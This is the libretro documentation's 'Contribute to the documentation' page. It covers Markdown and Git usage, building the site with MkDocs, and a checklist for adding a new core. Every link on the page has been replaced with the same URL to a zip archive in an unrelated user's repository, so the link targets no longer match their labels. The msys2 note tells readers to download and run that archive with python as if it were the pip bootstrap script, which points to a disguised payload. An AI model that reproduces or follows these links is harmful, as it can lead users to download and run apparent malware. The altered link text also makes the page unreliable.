# Contribute to the documentation

These docs are written in [Markdown.](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip) If you need help with the syntax, use [this guide](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip). Mkdocs uses some [Markdown extensions](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip) that you may have to familiarize with.

The documentation source is maintained via [Git](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip). For more info on how to use git, [refer to Github's help page.](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip)

In order to propose improvements to a document:

1. [Clone the repo](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip)
2. Make the changes and update your clone
3. Follow the "Building the docs" section to render the documentation site locally
4. Propose your changes using the button `New Pull Request` [in the docs repo](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip)

There is a To-Do list for libretro/docs *here* and you can submit suggestions or issues regarding documentation at the [libretro/docs issue tracker](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip).

## Building the docs

1. Make sure you have [Python](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip) and [pip](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip) installed
    ```
    python --version
    pip --version
    ```

!!! Note "Building in Windows/msys2"
    If you are using the standard RetroArch msys2 environment, you will need to install python with the command `pacman -S python`. Next you will need to download [the `https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip` script](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip) from the `pip` bootstrap site. Finally, execute the script with the command `python https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip`.

2. Install MkDocs
    ```
    pip install mkdocs
    ```

3. Install MkDocs-Material
    ```
    pip install mkdocs-material
    ```

4. Install PyMdown Extensions
    ```
    pip install pymdown-extensions
    ```
5. Install mkdocs-git-revision-date
    ```
    pip install mkdocs-git-revision-date-plugin
    ```
6. Install mkdocs-macros
    ```
    pip install mkdocs-macros-plugin
    ```

7. Build the site
    ```
    mkdocs build
    ```

8. The documentation will be built to the `site` directory; preview any changes with MkDocs' built-in dev-server before submitting a pull request
    ```
    mkdocs serve
    ```

**References**

  - [Guide to installing mkdocs](https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip)


## Adding a new core

These are the documents that should be added/updated when a new core is added to the libretro ecosystem.

- Add the core to docs/library/ (Follow the latest core template. https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip)
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip if it's related to another core in some way
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip if it supports softpatching
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip if it supports cheevos
- Add the core to https://github.com/Bruno13585/docs/raw/refs/heads/master/docs/image/core/pcsx_rearmed/Software-v1.0-alpha.4.zip if it needs a BIOS
